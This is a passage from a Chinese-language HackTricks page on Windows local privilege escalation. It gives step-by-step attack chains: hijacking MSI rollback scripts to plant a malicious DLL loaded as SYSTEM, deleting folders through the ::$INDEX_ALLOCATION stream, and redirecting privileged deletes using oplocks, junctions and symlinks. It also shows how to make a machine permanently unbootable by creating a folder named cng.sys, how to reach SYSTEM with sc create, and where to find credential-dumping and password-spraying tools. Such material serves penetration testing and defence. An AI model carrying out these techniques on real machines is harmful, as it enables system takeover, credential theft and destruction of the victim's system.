- Step 5: Manually Delete `.rbf`
- 你（攻击者）手动删除该 `.rbf` 文件。
- 现在 **`C:\Config.Msi` 为空**，可以被劫持。

> 此时，**触发 SYSTEM-level arbitrary folder delete vulnerability** 以删除 `C:\Config.Msi`。

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- 自行重新创建 `C:\Config.Msi` 文件夹。
- 设置 **弱 DACL**（例如 Everyone:F），并保持一个带有 `WRITE_DAC` 权限的句柄打开。

- Step 7: Run Another Install
- 再次安装该 `.msi`，并设置：
- `TARGETDIR`: 可写位置。
- `ERROROUT`: 一个触发强制失败的变量。
- 该安装将用于再次触发 **rollback**，该过程会读取 `.rbs` 和 `.rbf`。

- Step 8: Monitor for `.rbs`
- 使用 `ReadDirectoryChangesW` 监视 `C:\Config.Msi`，直到出现新的 `.rbs`。
- 捕获其文件名。

- Step 9: Sync Before Rollback
- 该 `.msi` 包含一个 **custom install action (`SyncBeforeRollback`)**，它会：
- 在 `.rbs` 创建时发出事件信号。
- 然后在继续之前 **等待**。

- Step 10: Reapply Weak ACL
- 在接收到 `.rbs created` 事件后：
- Windows Installer 会 **重新应用强 ACL** 到 `C:\Config.Msi`。
- 但因为你仍然持有一个带有 `WRITE_DAC` 的句柄，你可以再次 **重新应用弱 ACL**。

> ACL 只在打开句柄时强制生效，因此你仍然可以写入该文件夹。

- Step 11: Drop Fake `.rbs` and `.rbf`
- 覆盖 `.rbs` 文件为一个 **伪造的 rollback 脚本**，指示 Windows：
- 将你的 `.rbf` 文件（恶意 DLL）恢复到一个 **特权位置**（例如 `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）。
- 放置你的伪造 `.rbf`，其中包含一个 **恶意的 SYSTEM 级别 payload DLL**。

- Step 12: Trigger the Rollback
- 触发同步事件，使安装程序继续。
- 配置了一个 **type 19 custom action (`ErrorOut`)**，在已知点故意使安装失败。
- 这会导致 **rollback 开始**。

- Step 13: SYSTEM Installs Your DLL
- Windows Installer：
- 读取你恶意的 `.rbs`。
- 将你的 `.rbf` DLL 复制到目标位置。
- 现在你的 **恶意 DLL 已放置在 SYSTEM 加载路径** 中。

- Final Step: Execute SYSTEM Code
- 运行一个受信任的 **auto-elevated binary**（例如 `osk.exe`），它会加载你劫持的 DLL。
- **Boom**：你的代码以 **SYSTEM** 身份执行。

### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

主要的 MSI rollback 技术（上面所述）假设你可以删除一个 **整个文件夹**（例如 `C:\Config.Msi`）。但如果你的漏洞只允许 **arbitrary file deletion** 呢？

你可以利用 **NTFS internals**：每个文件夹都有一个隐藏的 alternate data stream，名为：
```
C:\SomeFolder::$INDEX_ALLOCATION
```
该流存储了该文件夹的 **索引元数据**。

因此，如果您 **删除文件夹的 `::$INDEX_ALLOCATION` 流**，NTFS **会从文件系统中删除整个文件夹**。

可以使用标准的文件删除 APIs，例如：
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> 即使你正在调用 *file delete API*，它**删除文件夹本身**。

### From Folder Contents Delete to SYSTEM EoP
如果你的 primitive 不允许删除任意文件/文件夹，但它**允许删除攻击者控制的文件夹的*contents***？

1. Step 1: 设置一个诱饵文件夹和文件
- 创建: `C:\temp\folder1`
- 在其内部: `C:\temp\folder1\file1.txt`

2. Step 2: 在 `file1.txt` 上放置一个 **oplock**
- 当有特权进程尝试删除 `file1.txt` 时，oplock 会**暂停执行**。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. 步骤 3：触发 SYSTEM 进程（例如，`SilentCleanup`）
- 该进程扫描文件夹（例如，`%TEMP%`）并尝试删除其内容。
- 当它到达 `file1.txt` 时，**oplock triggers** 并将控制权交给你的回调。

4. 步骤 4：在 oplock 回调中 – 重定向删除

- 选项 A：将 `file1.txt` 移到其他位置
- 这会清空 `folder1`，而不会破坏 oplock。
- 不要直接删除 `file1.txt` —— 那会过早释放 oplock。

- 选项 B：将 `folder1` 转换为 **junction**：
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- 选项 C: 在 `\RPC Control` 创建 **symlink**:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> 这针对存储文件夹元数据的 NTFS 内部流 — 删除它会删除该文件夹。

5. 第 5 步：释放 oplock
- SYSTEM 进程继续并尝试删除 `file1.txt`。
- 但现在，由于 junction + symlink，实际被删除的是：
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**结果**: `C:\Config.Msi` 被 SYSTEM 删除。

### 从 Arbitrary Folder Create 到 Permanent DoS

利用一个原语，允许你 **create an arbitrary folder as SYSTEM/admin** —— 即使 **you can’t write files** 或 **set weak permissions**。

创建一个 **folder**（不是 **file**），其名称为一个 **critical Windows driver**，例如：
```
C:\Windows\System32\cng.sys
```
- 此路径通常对应于 `cng.sys` 内核模式驱动程序。
- 如果你 **预先将其创建为文件夹**，Windows 在启动时无法加载实际驱动程序。
- 然后，Windows 在启动时尝试加载 `cng.sys`。
- 它看到该文件夹，**无法解析出实际驱动程序**，并且**导致崩溃或停止启动**。
- 在没有外部干预（例如启动修复或磁盘访问）的情况下，**没有回退**，也**无法恢复**。


## **从 High Integrity 到 System**

### **New service**

如果你已经在 High Integrity 进程上运行，**path to SYSTEM** 可以很简单，仅需 **创建并执行一个新的 service**：
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> 在创建服务二进制时，确保它是一个有效的 service，或者该二进制执行必要的操作，因为如果它不是有效的 service，会在 20s 内被终止。

### AlwaysInstallElevated

从一个 High Integrity 进程你可以尝试 **启用 AlwaysInstallElevated 注册表项** 并使用一个 _**.msi**_ 包装器 **安装** 一个反向 shell。\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**You can** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

如果你拥有那些 token 权限（通常会在已经是 High Integrity 的进程中发现），你将能够使用 SeDebug 权限 **打开几乎任何进程**（非 protected processes），**复制该进程的 token**，并用该 token 创建一个 **任意进程**。\
使用此技术通常会 **选择任何以 SYSTEM 运行且具有全部 token 权限的进程**（_是的，你可以找到没有全部 token 权限的 SYSTEM 进程_）。\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

该技术被 meterpreter 用于在 `getsystem` 中提升权限。该技术包括 **创建一个 pipe 然后创建/滥用一个 service 向该 pipe 写入**。随后，使用 **`SeImpersonate`** 权限创建该 pipe 的 **server** 将能够 **模拟 pipe 客户端（即该 service）的 token**，从而获取 SYSTEM 权限。\
If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation)。\
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

如果你能够 **劫持一个被以 **SYSTEM** 运行的 **process** 加载的 dll**，你就能以该权限执行任意代码。因此 Dll Hijacking 对此类权限提升也很有用，而且从 high integrity 进程进行往往 **更容易实现**，因为该进程通常对用于加载 dll 的文件夹具有 **写权限**。\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**查找 Windows 本地权限提升向量的最佳工具：** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 检查误配置和敏感文件（**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 检查一些可能的误配置并收集信息（**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 检查误配置**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- 提取 PuTTY, WinSCP, SuperPuTTY, FileZilla 和 RDP 的已保存会话信息。local 使用 -Thorough。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- 从 Credential Manager 中提取凭据。Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 在域内喷洒收集到的密码**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh 是一个 PowerShell ADIDNS/LLMNR/mDNS/NBNS 欺骗和中间人工具。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的 Windows 权限提升枚举**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- 搜索已知的 privesc 漏洞（已弃用，改用 Watson）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- 本地检查 **(需要 Admin 权限)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 搜索已知的 privesc 漏洞（需要使用 VisualStudio 编译）（[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson)）\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- 枚举主机以查找误配置（更像是信息收集工具而非纯粹的 privesc）（需要编译）（[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**）**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 从大量软件中提取凭证（github 上有预编译 exe）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp 的 C# 移植版本**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- 检查误配置（github 上有预编译可执行文件）。不推荐。在 Win10 下运行不佳。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 检查可能的误配置（python 打包为 exe）。不推荐。在 Win10 下运行不佳。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- 基于该文章创建的工具（不需要 accesschk 也能正常工作，但可以使用）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- 读取 **systeminfo** 的输出并推荐可用的 exploit（本地 python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- 读取 **systeminfo** 的输出并推荐可用的 exploit（本地 python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

你必须使用正确版本的 .NET 编译该项目（[see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。要查看受害主机上安装的 .NET 版本，你可以运行：
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 参考资料

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
